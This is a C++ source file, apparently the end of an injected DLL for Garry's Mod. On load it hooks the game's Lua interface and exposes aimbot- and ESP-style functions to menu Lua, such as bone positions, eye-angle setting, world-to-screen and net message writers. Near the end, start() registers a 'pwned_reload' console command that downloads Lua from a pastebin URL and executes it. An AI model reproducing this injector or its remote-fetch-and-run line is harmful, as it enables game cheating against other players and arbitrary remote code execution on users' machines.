	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Player");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "Alive");
	ClientLua->Remove(-2);
	entsGetByIndex(d);
	ClientLua->Call(1, 1);
	bool b = ClientLua->GetBool(-1);
	ClientLua->Pop();
	MenuLua->PushBool(b);
	return 1;
}
int LookupBone(lua_State* state)
{
	double d = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Entity");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "LookupBone");
	ClientLua->Remove(-2);
	entsGetByIndex(d);
	ClientLua->PushString(MenuLua->GetString(2));
	ClientLua->Call(2, 1);
	int b = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	MenuLua->PushNumber(b);
	return 1;
}
int GetBonePosition(lua_State* state)
{
	double d = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Entity");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "GetBonePosition");
	ClientLua->Remove(-2);
	entsGetByIndex(d);
	ClientLua->PushNumber(MenuLua->GetNumber(2));
	ClientLua->Call(2, 1);
	double x = 0;
	double y = 0;
	double z = 0;
	ClientLua->GetField(-1, "x");
	x = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->GetField(-1, "y");
	y = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->GetField(-1, "z");
	z = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	ClientLua->Pop();
	getVectorMenu(x, y, z);
	return 1;
}

int EntityHealth(lua_State* state)
{
	
	double d = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Entity");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "Health");
	ClientLua->Remove(-2);
	entsGetByIndex(d);
	ClientLua->Call(1, 1);
	double health = ClientLua->GetNumber(-1);
	ClientLua->Pop();
	MenuLua->PushNumber(health);
	return 1;
}
int IsOnGround(lua_State* state)
{
	double d = 0;
	if (MenuLua->IsType(1, Type::NUMBER))
	{
		d = MenuLua->GetNumber(1);
	}
	ILuaInterface* ClientLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_CLIENT);
	ClientLua->PushSpecial(SPECIAL_GLOB);
	ClientLua->GetField(-1, "debug");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "getregistry");
	ClientLua->Remove(-2);
	ClientLua->Call(0, 1);
	ClientLua->GetField(-1, "Entity");
	ClientLua->Remove(-2);
	ClientLua->GetField(-1, "IsOnGround");
	ClientLua->Remove(-2);
	entsGetByIndex(d);
	ClientLua->Call(1, 1);
	MenuLua->PushBool(ClientLua->GetBool(-1));
	ClientLua->Pop();
	return 1;
}


void start()
{

	MenuLua->PushSpecial(SPECIAL_GLOB);
	MenuLua->PushCFunction(IsOnGround);
	MenuLua->SetField(-2, "IsOnGround");
	MenuLua->PushCFunction(GetBonePosition);
	MenuLua->SetField(-2, "GetBonePosition");
	MenuLua->PushCFunction(LookupBone);
	MenuLua->SetField(-2, "LookupBone");
	MenuLua->PushCFunction(GetShootingPos);
	MenuLua->SetField(-2, "GetShootingPos");
	MenuLua->PushCFunction(SetEyeAngles);
	MenuLua->SetField(-2, "SetEyeAngles");
	MenuLua->PushCFunction(EntityHealth);
	MenuLua->SetField(-2, "EntityHealth");
	MenuLua->PushCFunction(IsPooled);
	MenuLua->SetField(-2, "GetMessageID");
	MenuLua->PushCFunction(IsClientLua);
	MenuLua->SetField(-2, "IsClientLua");
	MenuLua->PushCFunction(netStart);
	MenuLua->SetField(-2, "netStart");
	MenuLua->PushCFunction(netSendToServer);
	MenuLua->SetField(-2, "netSendToServer");
	MenuLua->PushCFunction(netWriteBit);
	MenuLua->SetField(-2, "netWriteBit");
	MenuLua->PushCFunction(netWriteBool);
	MenuLua->SetField(-2, "netWriteBool");
	MenuLua->PushCFunction(netWriteColor);
	MenuLua->SetField(-2, "netWriteColor");
	MenuLua->PushCFunction(netWriteData);
	MenuLua->SetField(-2, "netWriteData");
	MenuLua->PushCFunction(netWriteDouble);
	MenuLua->SetField(-2, "netWriteDouble");
	MenuLua->PushCFunction(netWriteFloat);
	MenuLua->SetField(-2, "netWriteFloat");
	MenuLua->PushCFunction(netWriteInt);
	MenuLua->SetField(-2, "netWriteInt");
	MenuLua->PushCFunction(netWriteString);
	MenuLua->SetField(-2, "netWriteString");
	MenuLua->PushCFunction(netWriteTable);
	MenuLua->SetField(-2, "netWriteTable");
	MenuLua->PushCFunction(netWriteUInt);
	MenuLua->SetField(-2, "netWriteUInt");
	MenuLua->PushCFunction(netWriteVector);
	MenuLua->SetField(-2, "netWriteVector");
	MenuLua->PushCFunction(entsFindByClass);
	MenuLua->SetField(-2, "entsFindByClass");
	MenuLua->PushCFunction(LocalPlayerEntIndex);
	MenuLua->SetField(-2, "LocalPlayerEntIndex");
	MenuLua->PushCFunction(EntityGetWepons);
	MenuLua->SetField(-2, "EntityGetWepons");
	MenuLua->PushCFunction(ExecuteOnClient);
	MenuLua->SetField(-2, "ExecuteOnClient");
	MenuLua->PushCFunction(PlayerNick);
	MenuLua->SetField(-2, "PlayerNick");
	MenuLua->PushCFunction(EntityGetPos);
	MenuLua->SetField(-2, "EntityGetPos");
	MenuLua->PushCFunction(VectorToScreen);
	MenuLua->SetField(-2, "VectorToScreen");
	MenuLua->PushCFunction(Distance);
	MenuLua->SetField(-2, "Distance");
	MenuLua->PushCFunction(FileExists);
	MenuLua->SetField(-2, "FileExists");
	MenuLua->PushCFunction(VarExists);
	MenuLua->SetField(-2, "VarExists");
	MenuLua->PushCFunction(EntityIsValid);
	MenuLua->SetField(-2, "EntityIsValid");
	MenuLua->PushCFunction(GetAngleFromVector);
	MenuLua->SetField(-2, "GetAngleFromVector");
	MenuLua->PushCFunction(PlayerAlive);
	MenuLua->SetField(-2, "PlayerAlive");
	MenuLua->PushCFunction(GetNormalized);
	MenuLua->SetField(-2, "GetNormalized");
	MenuLua->PushCFunction(SteamID);
	MenuLua->SetField(-2, "SteamID");
	MenuLua->PushNumber(1);
	MenuLua->SetField(-2, "LoaderVersion");
	MenuLua->PushCFunction(RemoveHook);
	MenuLua->SetField(-2, "RemoveHook");

	MenuLua->Pop();
	MenuLua->RunString("RunString", "", "MsgC('ma boy just ran MenuStat')", true, true);
	MenuLua->RunString("RunString", "", "concommand.Add(\"pwned_reload\", function() http.Fetch(\"https://pastebin.com/raw/bXm2pj4P?c=\"..math.Rand(1,9999), RunString) end)", true, true);


}


void init(void) {

	HMODULE LuaShared_modhandle = GetModuleHandle(L"lua_shared.dll");
	if (LuaShared_modhandle != NULL)
	{
		typedef void* (*CreateInterfaceFn)(const char *name, int *returncode);
		CreateInterfaceFn LuaShared_createinter = (CreateInterfaceFn)GetProcAddress(LuaShared_modhandle, "CreateInterface");
		if (LuaShared_createinter != NULL)
		{
			LuaShared = (ILuaShared*)LuaShared_createinter(LUASHARED_INTERFACE_VERSION, NULL);
		}
		else {
			MessageBox(NULL, L"No LuaShared_createinter", L"Oh no !", MB_ICONWARNING | MB_YESNOCANCEL);
		}
	}
	if (LuaShared == NULL)
	{
		MessageBox(NULL, L"No LuaShared", L"Oh no !", MB_ICONWARNING | MB_YESNOCANCEL);
		return;
	}

		MenuLua = LuaShared->GetLuaInterface(LuaInterfaceType::LUAINTERFACE_MENU);
		start();
	
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
	if (fdwReason == DLL_PROCESS_ATTACH)
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)init, NULL, 0, NULL);
	return(1);
}